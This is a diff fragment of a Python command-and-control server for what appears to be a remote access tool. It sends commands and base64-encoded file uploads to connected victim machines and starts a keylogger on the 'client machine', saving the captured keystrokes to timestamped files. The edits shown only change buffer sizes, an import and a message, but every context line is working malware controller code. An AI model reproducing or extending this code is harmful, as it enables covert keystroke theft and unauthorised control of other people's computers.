@@ -2,7 +2,7 @@ import socket
 import base64
 import time
 import keyboard
-import threading
+
 #create socket for client connection(n9drou ndirou multiple clients !)
 def handle_client(client_socket):
 	while True:
@@ -21,11 +21,11 @@ def handle_client(client_socket):
 				command = f"upload {command.split(' ')[2]}"
 				client_socket.send(command.encode())
 				client_socket.send(encoded_data.encode())
-				output = client_socket.recv(1000000).decode()
+				output = client_socket.recv(4096).decode()
 				print(output)
 				continue
 
-			output = client_socket.recv(1000000).decode()
+			output = client_socket.recv(10000000).decode()
 			
 			print(output)
 
@@ -65,7 +65,7 @@ def handle_client(client_socket):
 					continue
 			if command == 'keylogger':
 				#if messege == "Keylogging ...":
-				print("\npress esq to stop keylogging on client machine")
+				print("\nPress esq to stop keylogging on client machine")
 				keyboard.wait("esc")
 				client_socket.send("stop".encode())
 				filename = f"keylogg{int(time.time())}.txt"
